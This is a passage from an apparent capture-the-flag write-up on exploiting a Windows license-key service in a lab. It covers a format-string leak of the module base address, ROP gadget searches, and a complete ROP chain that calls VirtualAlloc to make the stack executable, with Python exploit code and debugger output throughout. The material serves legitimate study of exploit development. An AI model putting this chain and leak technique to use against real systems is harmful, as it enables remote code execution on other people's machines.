rdx=0000000000000000 rsi=0000000000000000 rdi=4141414141414141
rip=00007ff766a816f1 rsp=000000d2a29fe908 rbp=0000000000000000
 r8=0000000000000054  r9=0000000000000054 r10=0000000000000007
r11=000000d2a29fe820 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
```

RDI currently holds AAAAA... 

With any luck, I would be able to locate the offset of RDI at time of crash, inject a format string at that location, and dereference pointers to obtain leaked addresses.  But then there's also the matter of, how to get the application to report them back to me.   A lot to figure out.  Let's start with RDI pattern and offset.

##### RDI pattern and offset

If I send another 3000 byte pattern :

```python
    pattern = sys.argv[2]
    pay = (base64.b64encode(bytearray(pattern,'latin-1'))).decode('latin-1')
    bufs = [ "1\n", f"110-FE9A1-550-A271-0109-{pay}\n", "2\n", "3\n"]
    for x in range(0,len(bufs)):
        print(sock.recv(4096))
        print(f"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]")
        sock.send(bufs[x].encode('latin-1'))
```

This time RDI holds a pattern:  `4138634137634136`

```
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ msf-pattern_offset 64 -l 3000 -q 4138634137634136
[*] Exact match at offset 80
```

Not quite sure that's going to work.  I tried playing with format strings in this range but anything supplied here just gets converted to hex on the other end.  So `%d` for example is converted to hex `2564`.  Not going to work.

### Time for another plan

While playing around with the application, I noticed that if you set a key and then activate it, it gets repeated back to you with the base64 decoded, if it is valid format:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ nc 192.168.56.100 4141
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: 100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
Valid key format
Choose an option:
4. Set key
5. Activate key
6. Exit
2
Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License
Could not find key!
Choose an option:
7. Set key
8. Activate key
9. Exit

```

This part of output:
```
Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License
```

If we try to send a format string instead:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ nc 192.168.56.100 4141
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: %s%p
Invalid key format
Choose an option:
4. Set key
5. Activate key
6. Exit
2

Could not find key!
Choose an option:
1. Set key
2. Activate key
3. Exit
```

It doesn't work, we get an empty string.

However when I set a key, activate it, then set another key as a format string, and activate that, I get a leak of some kind:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ nc 192.168.56.100 4141
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: 110-FE9A1-550-A271-0109-U3RhbmRhcmQgTGljZW5zZQ==
Valid key format
Choose an option:
4. Set key
5. Activate key
6. Exit
2
Checking key: 110-FE9A1-550-A271-0109, Comment: Standard License
Could not find key!
Choose an option:
7. Set key
8. Activate key
9. Exit
1
Enter a key: %s%p
Invalid key format
Choose an option:
10. Set key
11. Activate key
12. Exit
2
Checking key: Checking key: 000001BA0, Comment: 
Could not find key!
Choose an option:
13. Set key
14. Activate key
15. Exit
```

This:

```
Checking key: Checking key: 000001BA0, Comment: 
```

It repeated the "Checking key: " portion, but probably because my format string was `%s%p`.  If I rerun the test with just `%p`:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ nc 192.168.56.100 4141
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: 110-FE9A1-550-A271-0109-U3RhbmRhcmQgTGljZW5zZQ==
Valid key format
Choose an option:
4. Set key
5. Activate key
6. Exit
2
Checking key: 110-FE9A1-550-A271-0109, Comment: Standard License
Could not find key!
Choose an option:
7. Set key
8. Activate key
9. Exit
1
Enter a key: %p
Invalid key format
Choose an option:
10. Set key
11. Activate key
12. Exit
2
Checking key: 00007FF74BD10660
, Comment: 
Could not find key!
Choose an option:
13. Set key
14. Activate key
15. Exit
```

I get a leak!

```
Checking key: 00007FF74BD10660
, Comment:
```

Looking at windbg to see if I can identify what range the address is from:

```
Symbol search path is: srv*c:\symbols;srv*C:\symbols*https://msdl.microsoft.com/download/symbols;C:\symbolsextra
Executable search path is: 
ModLoad: 00007ff7`4bcf0000 00007ff7`4bd23000   C:\reaper\dev_keysvc.exe
ModLoad: 00007fff`c0630000 00007fff`c0828000   C:\Windows\SYSTEM32\ntdll.dll
ModLoad: 00007fff`bef90000 00007fff`bf052000   C:\Windows\System32\KERNEL32.DLL
ModLoad: 00007fff`bdfe0000 00007fff`be2d6000   C:\Windows\System32\KERNELBASE.dll
ModLoad: 00007fff`c0360000 00007fff`c03cb000   C:\Windows\System32\WS2_32.dll
ModLoad: 00007fff`c04d0000 00007fff`c05f0000   C:\Windows\System32\RPCRT4.dll
ModLoad: 00007fff`bd370000 00007fff`bd3da000   C:\Windows\system32\mswsock.dll

```

It is from `dev_keysvc.exe`

```
ModLoad: 00007ff7`4bcf0000 00007ff7`4bd23000   C:\reaper\dev_keysvc.exe
```

Calculating the difference from base

```python
In [4]: base=int("00007ff74bcf0000",16)

In [5]: leak=int("00007FF74BD10660",16)

In [6]: leak - base
Out[6]: 132704

In [7]: f"{leak - base:08x}"
Out[8]: '00020660'
```

The following formula captures the leaked address, deducts the offset to the base address of `dev_keysvc.exe`, then returns the base address.

```python
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ cat poc.py | awk -v RS="" '/get_leak/'

def get_leak(sock):
    # ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
    # └─$ echo "Hello" | base64 -w0
    # SGVsbG8=
    bufs = [ "1\n", "110-FE9A1-550-A271-0109-SGVsbG8=\n", "2\n", "1\n", "%p\n", "2\n"]
    for x in range(0,len(bufs)):
        recvd = sock.recv(4096).decode('latin-1')
        dprint(recvd)
        if "key format" in recvd or 'Checking key' in recvd:
            recvd = sock.recv(4096).decode('latin-1')
            dprint(recvd)
        print(f"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]")
        sock.send(bufs[x].encode('latin-1'))
    leak = sock.recv(4096).decode('latin-1').split("\n")[0].split(" ")[2]
    baseaddr = int(leak,16) - 132704
    print(f"** dev_keysvc leakaddr: 0x{leak} **")
    print(f"** dev_keysvc baseaddr: 0x{baseaddr:016x} **")
    return baseaddr 
    
```

The net result when executed:
```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ ./poc.py 192.168.56.100:4141
** dev_keysvc leakaddr: 0x00007FF74BD10660 **
** dev_keysvc baseaddr: 0x00007ff74bcf0000 **
```

Time for some ROP gadgets to add the base to

### Finding ROPgadgets

The calling convention for x64 Windows, at least the first four arguments, is RCX, RDX, R8, and R9 (https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170).  So the call to VirtualAlloc needs to look like this:

```c
LPVOID VirtualAlloc(
	RCX=RSP+offset  // [in, optional] LPVOID lpAddress,
	RDX=0x1000      // [in]           SIZE_T dwSize,
	R8=0x1000       // [in]           DWORD  flAllocationType,
	R9=0x40         // [in]           DWORD  flProtect
);
```

For finding ROP gadgets, I have a tool I made that wraps around `rp++` and extends its capabilities a bit.  The tool is called `rp++-ng` (https://github.com/SYANiDE-/rp-ng).  Most of the capability revolves around the tool performing a collection of regex idioms against `rp++`, and using an `ncurses`-based menu to manually select gadgets (`space`) that you find to be interesting or maybe useful, and moving through each new regex pattern match (`q`).  At the end it displays all the selected gadgets in a consumable list.  Other capabilities, like filtering out duplicates, adjusting the base virtual address of the output, filtering out badchar opcodes, and other useful features.  

In the below, I have set the VA for all gadgets to start at a base of `0x0` (as we'll be working in relative addresses to baseaddr of `dev_keysvc.exe`), gadgets max length 10 instructions, sorted (from shortest to longest length), remove duplicates (-u), and use a looser set of regex idioms for matching (-l).  

Here is an initial list of gadgets I curated and selected, which I thought might be useful, who knows.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ rp++-ng --file dev_keysvc.exe --va 0x0 --roplen 10 -s -u -l 2>/dev/null

  rp++-ng?                           ^^           
             _________ _________      ___ __  __________ `
   .       |    _o___|    _o___ ++- |   \  |/   /_____/  !
          |___|\____|___|%%%%%     |____\_|\___\____.] 
  z        `BB' `BBB'`B'           `BBBBBBB' `BBBBBBBB' 
     ;                                    Chain faster
              [[                            $$$$$ $$$$$$      i
                    +                                    SYANiDE
        

0x5af0: jmp r10 ; 
0x2cf2: jmp r11 ; 
0x5ade: jmp rax ; 
0x2cf3: jmp rbx ; 
0x2aac: jmp rcx ; 
0x38c8: jmp rdx ; 
0x1ef3d: jmp rdi ; 
0x2aab: jmp r9 ; 
0x37b9: call r8 ; 
0x3692: call rax ; 
0x1f324: call rbx ; 
0x184b8: call rdx ; 
0x158a: xor al, al ; ret ; 
0x25a0: xor eax, eax ; ret ; 
0x1fa1: xor ebx, esp ; ret ; 
0x1fa0: xor rbx, rsp ; ret ; 
0x1f27f: xor rax, rax ; ret ; 
0x3db5: push rdi ; ret ; 
0x53cd: push rax ; pop r14 ; ret ; 
0xfb0a: push rax ; pop rbp ; ret ; 
0x5d6d: push rax ; pop rdi ; ret ; 
0x1fc2: push rbx ; pop rax ; ret ; 
0x14b02: push rax ; pop r15 ; ret ; 
0x1e532: push rax ; pop rbx ; ret ; 
0x2bb9: push rsp ; add eax, esi ; ret ; 
0x47b3: pop r13 ; ret ; 
0x488f: pop r14 ; ret ; 
0x644d: pop r15 ; ret ; 
0x150a: pop rax ; ret ; 
0x259e: pop rbp ; ret ; 
0x20d9: pop rbx ; ret ; 
0x16f0: pop rdi ; ret ; 
0x4116: pop rsi ; ret ; 
0xa99c: pop rsp ; ret ; 
0x31dc: pop rcx ; clc ; ret ; 
0x31b6: pop rcx ; cld ; ret ; 
0xe97a: xchg eax, edx ; ret ; 
0x271c: xchg eax, esp ; ret ; 
0x15765: xchg eax, ebp ; ret ; 
0xae07: mov al, dl ; ret ; 
0x9ec5: mov al, r8L ; ret ; 
0x30f2: mov eax, ebx ; ret ; 
0x5437: mov eax, ecx ; ret ; 
0x1f81: mov ecx, eax ; ret ; 
0x1fb4: mov esp, ebx ; ret ; 
0x1fb3: mov r12, rbx ; ret ; 
0x30f1: mov rax, r11 ; ret ; 
0x1f381: mov rax, r9 ; ret ; 
0x5436: mov rax, rcx ; ret ; 
0x1f80: mov rcx, rax ; ret ; 
0x1402f: mov eax, edx ; ret ; 
0x1402e: mov rax, rdx ; ret ; 
0xa7cd: mov rsp, r11 ; pop rbp ; ret ; 
0x11a73: mov rsp, r11 ; pop r14 ; ret ; 
0x1cd19: mov rsp, r11 ; pop rdi ; ret ; 
0x1f90: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ; 
0x1547f: mov rax, qword [rax] ; add rsp, 0x28 ; ret ; 
0x4524: mov rax, qword [rcx] ; mov [rdx+rax], r8d ; ret ; 
0x2b8d: mov rcx, qword [rdx] ; mov qword [rax], rcx ; ret ; 
0x2b55: mov r8, qword [rdx] ; movzx ecx, byte [rdx+0x08] ; mov qword [rax], r8 ; mov byte [rax+0x08], cl ; ret ; 
0x2b90: mov qword [rax], rcx ; ret ; 
0x5433: mov qword [rcx], rax ; mov rax, rcx ; ret ; 
0x2b69: mov qword [rax], r8 ; mov [rax+0x08], ecx ; ret ; 
0x1b90e: mov qword [r8], rax ; mov eax, 0x00000001 ; ret ; 
0x2b5c: mov qword [rax], r8 ; mov byte [rax+0x08], cl ; ret ; 
0x2b4d: mov qword [rax], r8 ; mov word [rax+0x08], cx ; ret ; 
0xa28c: mov qword [r8], rax ; xor eax, eax ; add rsp, 0x38 ; ret ; 
0xfdae: mov r14, qword [rsp+0x18] ; ret ; 
0x35af: mov rbx, qword [rsp+0x08] ; ret ; 
0xe410: mov rdi, qword [rsp+0x20] ; ret ; 
0x1c7e3: mov rsi, qword [rsp+0x18] ; pop rdi ; ret ; 
0x9ec0: mov rbx, qword [rsp+0x08] ; mov al, r8L ; ret ; 
0x2024: mov r11, qword [rsp+0x08] ; add rsp, 0x10 ; ret ; 
0x43f5: mov rax, qword [rax+0x60] ; add rsp, 0x28 ; ret ; 
0x743d: mov rbp, qword [rsp+0x50] ; add rsp, 0x30 ; pop rdi ; ret ; 
0x2851: mov rbx, qword [rsp+0x30] ; add rsp, 0x20 ; pop rdi ; ret ; 
0x4886: mov rdi, qword [rsp+0x40] ; add rsp, 0x20 ; pop r14 ; ret ; 
0x6444: mov rdi, qword [rsp+0x40] ; add rsp, 0x20 ; pop r15 ; ret ; 
0x7003: mov qword [r9+0x40], rax ; ret ; 
0x159f: mov qword [rsp+0x20], r9 ; ret ; 
0xe1a0: mov qword [rcx+0x08], rax ; ret ; 
0x31da: mov qword [rcx-0x08], r11 ; ret ; 
0x102fc: mov qword [rcx+0x10], rax ; xor eax, eax ; ret ; 
0x159a: mov qword [rsp+0x18], r8 ; mov qword [rsp+0x20], r9 ; ret ; 
0xe272: mov qword [rcx+0x08], r9 ; mov [rcx+0x28], 0x0000000A ; ret ; 
0xd99d: inc eax ; ret ; 
0xd99c: inc rax ; ret ; 
0xecec: inc ebx ; lea rax, qword [rax+rcx-0x02] ; ret ; 
0x152fb: inc qword [rdx] ; movzx eax, cl ; ret ; 
0x17e3c: dec eax ; ret ; 
0xe4a2: dec qword [rax] ; mov al, 0x01 ; add rsp, 0x20 ; pop rdi ; ret ; 
0x391b: add rax, r8 ; ret ; 
0x5e9e: add eax, ecx ; ret ; 
0x2bba: add eax, esi ; ret ; 
0x5e9d: add rax, rcx ; ret ; 
0x391c: add eax, eax ; ret ; 
0x1e20e: add esi, esi ; ret ; 
0x3918: add r8, r9 ; add rax, r8 ; ret ; 
0x10949: sub eax, ecx ; ret ; 
0x1fb1: sub ebx, eax ; mov r12, rbx ; ret ; 
0x1fb0: sub rbx, rax ; mov r12, rbx ; ret ; 
0x13e54: sub rcx, r9 ; mov rax, rcx ; ret ; 
0x14027: sub rdx, r8 ; sar rdx, 1 ; mov rax, rdx ; ret ; 
0xecfd: or ah, bh ; ret ; 
0xed15: or al, bh ; ret ; 
0xeceb: or bh, bh ; ret ; 
0xed03: or bl, bh ; ret ; 
0xecf7: or ch, bh ; ret ; 
0xed0f: or cl, bh ; ret ; 
0xecf1: or dh, bh ; ret ; 
0xed09: or dl, bh ; ret ; 
0x1d6f7: or eax, ebp ; ret ; 
0x1bd3f: or eax, edx ; ret ; 
0x1bd95: or eax, r8d ; ret ; 
0x1bd8c: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ; 
0x1bd89: or r8d, ecx ; or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ; 
0xd99a: neg eax ; inc rax ; ret ; 
0xd999: neg rax ; inc rax ; ret ; 
0x24ea: neg eax ; dec eax ; add rsp, 0x28 ; ret ; 
0x53cd: push rax ; pop r14 ; ret ; 
0xfb0a: push rax ; pop rbp ; ret ; 
0x5d6d: push rax ; pop rdi ; ret ; 
0x1fc2: push rbx ; pop rax ; ret ; 
0x14b02: push rax ; pop r15 ; ret ; 
0x1e532: push rax ; pop rbx ; ret ;
```

I had a really hard time finding gadgets that even do anything with registers `r8` and `r9`, so I needed to perform an additional search using regex to try and collect additional gadgets which, may have been missed by standard and looser idioms.

The hunt is meager.  I found only one gadget that can do something to `r9` as a destination register, so that is going to have to be a basis.  The following gadgets are going to have to do, maybe I missed something but it seems that this is all there is that are remotely rational.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ rp++-ng --file dev_keysvc.exe --va 0x0 --roplen 10 -s -u -R "(push|pop|xchg|mov|xor|add|sub|and|or|not|neg) (r8|r9)(, (...|r8|r9))?.*ret" 2>/dev/null

  rp++-ng?                           ^^           
             _________ _________      ___ __  __________ `
   .       |    _o___|    _o___ ++- |   \  |/   /_____/  !
          |___|\____|___|%%%%%     |____\_|\___\____.] 
  z        `BB' `BBB'`B'           `BBBBBBB' `BBBBBBBB' 
     ;                                    Chain faster
              [[                            $$$$$ $$$$$$      i
                    +                                    SYANiDE
        

0x3918: add r8, r9 ; add rax, r8 ; ret ; 
0x1f90: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ; 
0x1f93: mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ; 
0x1bd8c: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ; 
0x2b55: mov r8, qword [rdx] ; movzx ecx, byte [rdx+0x08] ; mov qword [rax], r8 ; mov byte [rax+0x08], cl ; ret ; 
0x2b46: mov r8, qword [rdx] ; movzx ecx, word [rdx+0x08] ; mov qword [rax], r8 ; mov word [rax+0x08], cx ; ret ; 
0x1bd89: or r8d, ecx ; or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ; 
```

It's a good starting point, but I've found typically I need to do some spot-searching for additional gadgets, that's where regex comes in handy.

As for the call to `VirtualAlloc`, it is in the IAT 

```
    7ff74bd10000 58 b6 02        addr       KERNEL32.DLL::VirtualAlloc
                 00 00 00 
                 00 00

```

It will need to be dereferenced in order to get the real address.

Let the ROPchaining begin.

### ROPchaining

First, create an `sqlite` database and import the gadgets.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ sqlite3 gadgets.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> create table gadgets( gadget varchar );
sqlite> .import gadgets.txt gadgets
sqlite> .q
```

Easier to find relevant gadgets now, wherever I'm at

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/reaper]
└─$ sqlite3 gadgets.db "select gadget from gadgets where gadget like '%r9%'"
0x2aab: jmp r9 ; 
0x1f381: mov rax, r9 ; ret ; 
0x1f90: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ; 
0x7003: mov qword [r9+0x40], rax ; ret ; 
0x159f: mov qword [rsp+0x20], r9 ; ret ; 
0x159a: mov qword [rsp+0x18], r8 ; mov qword [rsp+0x20], r9 ; ret ; 
0xe272: mov qword [rcx+0x08], r9 ; mov [rcx+0x28], 0x0000000A ; ret ; 
0x3918: add r8, r9 ; add rax, r8 ; ret ; 
0x13e54: sub rcx, r9 ; mov rax, rcx ; ret ; 
0x3918: add r8, r9 ; add rax, r8 ; ret ; 
```

I have a function for creating `struct.pack`'ed data of arbitrary format
```python
def packlatin(fmt, inp):
        return pack(fmt, inp).decode('latin-1')
```

And a function for building a ROPchain, takes a base address and adds the base to RVAs, packs the values as qwords, and concatenates the values as a single string.

```python
def ROPchain1(base):
    return "".join([packlatin("<Q",x) for x in [
        base+0x20d9,        #: pop rbx ; ret ;
        0x1000,
        base+0x1f90,        #: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;
        0xfeedcafedeadbeef,
                
    ]])
```

In order to debug the ROPchain, I need to figure out the exact return address that  crashes.  As it turns out, it is the return instruction of the function I step over, not a nested return.  `00007ff74bcf16f1`

![[Pasted_image_20251102135755.png]]

For reference we're talking about this function here:

![[Pasted_image_20251109120758.png]]

I set a breakpoint for the address of the return instruction at the end of `crash_in_here`, after the three continues, that way I can step into the return, which takes me right to the ROPchain.

```sh
((cmd.exe /c "taskkill /F /IM dev_keysvc.exe" && timeout 1 && START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) || START /B "" "C:\reaper\dev_keysvc.exe" > c:\reaper\output.txt) && timeout 1 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" -WF C:\windbg_custom.WEW -pn dev_keysvc.exe -c 'bp 0x7ff74bcf1937; g; g; g; bp 0x00007ff74bcf16f1; g;'
```

When I resend the payload, execution stops at the return instruction.  I step into it, and I am in the ROPchain:

```
00007fff`c06d10d0 cc              int     3
0:003> bp 0x7ff74bcf1937; g; g; g; bp 0x00007ff74bcf16f1; g;
ModLoad: 00007fff`bbb30000 00007fff`bbb42000   C:\Windows\SYSTEM32\kernel.appcore.dll
ModLoad: 00007fff`bf620000 00007fff`bf6be000   C:\Windows\System32\msvcrt.dll
Breakpoint 0 hit
*** WARNING: Unable to verify checksum for C:\reaper\dev_keysvc.exe
Breakpoint 0 hit
Breakpoint 0 hit
Breakpoint 1 hit
dev_keysvc+0x16f1:
00007ff7`4bcf16f1 c3              ret
0:003> t
dev_keysvc+0x20d9:
00007ff7`4bcf20d9 5b              pop     rbx
```

Rather than bore with the gritty details, lets jump straight to the ROPchain I settled on.

### Final ROPchain

`r8` and `r9` are going to be the hardest to work around, due to the lack of gadgets so the options are limited.

The one gadget I have to work with for `r9` nukes `r8` in the process, so need to get `r9` right out of the way.  I'll pop `0x40` into `rbx`, then use the one gadget to `mov r9, rbx`.  Consequentially, `r8` gets nulled.  And `rsp` gets `0x08` added to it, so need  a dummy qword to realign.

```python
        ## 0x1000 to r9
        base+0x20d9,        #: pop rbx ; ret ;
        0x40,
        base+0x1f90,        #: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;
        0xfeedcafedeadbeef,
```

`r8` is a little more nuanced.  I'll pop `0x1000` into `rax`, exchange `eax` and `edx` , then `or` `edx` against `r8d`, net-effect is like a `mov`.  The rest of the instructions do not affect my setup for the `VirtualAlloc` call or existing registers to that end.

```python
		## 0x1000 to r8
        base+0x150a,        #: pop rax ; ret ;
        0x1000,
        base+0xe97a,        #: xchg eax, edx ; ret ;
        base+0x1bd8c,       #: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ;
```

`rdx` is even easier, because its already `0x1000` as a consequence of setting for `r8`

```python
		## 0x1000 to rdx
		## Nothing needed, rdx is already 0x1000 because of r8 above

        # 0:003> r
        # rax=0000000000001000 rbx=0000000000000040 rcx=75370cfeeea40000
        # rdx=0000000000001000 rsi=0000000000000000 rdi=4141414141414141
        # rip=00007ff74bcf1fa0 rsp=000000f65adfe690 rbp=0000000000000000
        # r8=0000000000001000  r9=0000000000000040 r10=0000000000000000
        # r11=000000f65adfe560 r12=0000000000000000 r13=0000000000000000
        # r14=0000000000000000 r15=0000000000000000
```

`rcx` is the most complex of the four registers, but not by much.  `rbx` is already `0x40`, and the address doesn't have to be exacting because the `VirtualAlloc` is done on an entire page, any address within it will do.  Now is a good time to save `rbx`, because it has an approximate address in the range of where we eventually jump after `VirtualAlloc`.  So that gets saved to `r12` for the end.  Push `rbx` and pop back in `rax`, then `mov rcx`.  

```python
        ## rsp to rcx
        base+0x1fa0,        #: xor rbx, rsp ; ret ;
        base+0x1fb3,        #: mov r12, rbx ; ret ;  ## for jmp/call rax later
        base+0x1fc2,        #: push rbx ; pop rax ; ret ;
        base+0x1f80,        #: mov rcx, rax ; ret ;
```

And then there's calling `VirtualAlloc`.  The address of `VirtualAlloc` from the IAT Import Address Table gets popped into `rax`.  However we can't call that directly, it needs to be dereferenced first.  That is made possible by the `mov rax, qword [rax]`, which takes the value pointed at by `rax` and places that into `rax`.  The cost of this gadget is that `rsp` gets incremented by `0x28`, so five dummy qwords are placed on the stack afterward to realign.  The `ret` statement of that gadget net-effect jumps over those five qwords and lands at the `push rax` gadget.  `rax` is pushed onto the stack, popped back into `rdi`.  Then `rdi` is pushed onto the stack, and `ret`urned to. 

```python
        ## call VirtualAlloc
        base+0x150a,        #: pop rax ; ret ;
        base+0x20000,       ## IAT VirtualAlloc VA
        base+0x1547f,       #: mov rax, qword [rax] ; add rsp, 0x28 ; ret ;
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        base+0x5d6d,        #: push rax ; pop rdi ; ret ;
        base+0x3db5,        #: push rdi ; ret ;
```

The call to `VirtualAlloc` requires a scratch area, "shadow space", `rsp` immediately following the call.  Callee is responsible for stack cleanup, which means `rsp` needs to be realigned after `VirtualAlloc`.  The convention calls for 32 bytes (0x20).  I found a gadget for adding `0x28` to `rsp`.  

```python
		## realign RSP, RE: shadow space / VA scratch area
		base+0x175b,          #: add rsp, 0x28 ; ret ;
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
```

Finally, a chain for controlling `rip`.  The following adds an offset to the `rsp` (at the time) that was `xor`'d into `rbx`, and then saved into `r12`.  And then jumps there.

```python
		## jmp/call rsp
        base+0x150a,        #: pop rax ; ret ;
        0xf0,
        base+0x368c         #: add rax, r12 ; mov rdx, r13 ; call rax ;
```


The final ROPchain

```python
def ROPchain1(base):
    ## crashtime regs
    # 0:003> r
    # rax=00000000ffffffff rbx=000001e554b7bc60 rcx=4a4db4eaa5a70000
    # rdx=0000000000000000 rsi=0000000000000000 rdi=4141414141414141
    # rip=00007ff766a816f1 rsp=000000d2a29fe908 rbp=0000000000000000
    # r8=0000000000000054  r9=0000000000000054 r10=0000000000000007
    # r11=000000d2a29fe820 r12=0000000000000000 r13=0000000000000000
    # r14=0000000000000000 r15=0000000000000000
    # iopl=0         nv up ei pl nz na po nc
    # cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
    return "".join([packlatin("<Q",x) for x in [
        ## 0x40 to r9
        base+0x20d9,        #: pop rbx ; ret ;
        0x40,
        base+0x1f90,        #: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;
        0xfeedcafedeadbeef,

        ## 0x1000 to r8
        base+0x150a,        #: pop rax ; ret ;
        0x1000,
        base+0xe97a,        #: xchg eax, edx ; ret ;
        base+0x1bd8c,       #: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ;

        ## 0x1000 to rdx
		## Nothing needed, rdx is already 0x1000 because of r8 above

        # 0:003> r
        # rax=0000000000001000 rbx=0000000000000040 rcx=75370cfeeea40000
        # rdx=0000000000001000 rsi=0000000000000000 rdi=4141414141414141
        # rip=00007ff74bcf1fa0 rsp=000000f65adfe690 rbp=0000000000000000
        # r8=0000000000001000  r9=0000000000000040 r10=0000000000000000
        # r11=000000f65adfe560 r12=0000000000000000 r13=0000000000000000
        # r14=0000000000000000 r15=0000000000000000


        ## rsp to rcx
        base+0x1fa0,        #: xor rbx, rsp ; ret ;
        base+0x1fb3,        #: mov r12, rbx ; ret ;  ## for jmp/call rsp later
        base+0x1fc2,        #: push rbx ; pop rax ; ret ;
        base+0x1f80,        #: mov rcx, rax ; ret ;

        ## call VirtualAlloc
        base+0x150a,        #: pop rax ; ret ;
        base+0x20000,       ## IAT VirtualAlloc VA
        base+0x1547f,       #: mov rax, qword [rax] ; add rsp, 0x28 ; ret ;
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        base+0x5d6d,        #: push rax ; pop rdi ; ret ;
        base+0x3db5,        #: push rdi ; ret ;

        ## realign RSP, RE: shadow space / VA scratch area
        base+0x175b,          #: add rsp, 0x28 ; ret ;
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,
        0xfeedcafedeadbeef,

        ## jmp/call rsp
        base+0x150a,        #: pop rax ; ret ;
        0xf0,
        base+0x368c         #: add rax, r12 ; mov rdx, r13 ; call rax ;
```

When I step through execution to the `ret` instruction in the last gadget for calling `VirtualAlloc`,  `push rdi ; ret ;`, and check memory protection on `rsp`, the protection is `0x4` `PAGE_READWRITE`:

```
0:003> 
dev_keysvc+0x3db5:
00007ff7`4bcf3db5 57              push    rdi
0:003> 
dev_keysvc+0x3db6:
00007ff7`4bcf3db6 c3              ret
0:003> !vprot rsp
BaseAddress:       000000dc9fafe000
AllocationBase:    000000dc9fa00000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000002000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE
```

If I step through and step out of `VirtualAlloc`, then re-check protection, it has been updated, and protection is now `0x40` `PAGE_EXECUTE_READWRITE`

```
0:003> t
KERNEL32!VirtualAllocStub:
00007fff`befa8840 48ff25e9c30600  jmp     qword ptr [KERNEL32!_imp_VirtualAlloc (00007fff`bf014c30)] ds:00007fff`bf014c30={KERNELBASE!VirtualAlloc (00007fff`be03fd10)}
0:003> pt
KERNELBASE!VirtualAlloc+0x5a:
00007fff`be03fd6a c3              ret
0:003> t
dev_keysvc+0x2bb9:
00007ff7`4bcf2bb9 54              push    rsp
0:003> !vprot rsp
BaseAddress:       000000dc9fafe000
AllocationBase:    000000dc9fa00000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000002000
State:             00001000  MEM_COMMIT
Protect:           00000040  PAGE_EXECUTE_READWRITE
Type:              00020000  MEM_PRIVATE
```

Stepping through `call rax`, I land in nopsled1:

```
0:003> dd rax
00000052`0d3fe800  90909090 90909090 90909090 90909090
00000052`0d3fe810  90909090 90909090 90909090 90909090
00000052`0d3fe820  90909090 90909090 90909090 90909090
00000052`0d3fe830  90909090 90909090 90909090 90909090
00000052`0d3fe840  43434343 43434343 43434343 43434343
00000052`0d3fe850  43434343 43434343 43434343 43434343
00000052`0d3fe860  43434343 43434343 43434343 43434343
00000052`0d3fe870  43434343 43434343 43434343 43434343
```

The following stub breaks right to the `call rax` instruction after sending the payload:
```sh
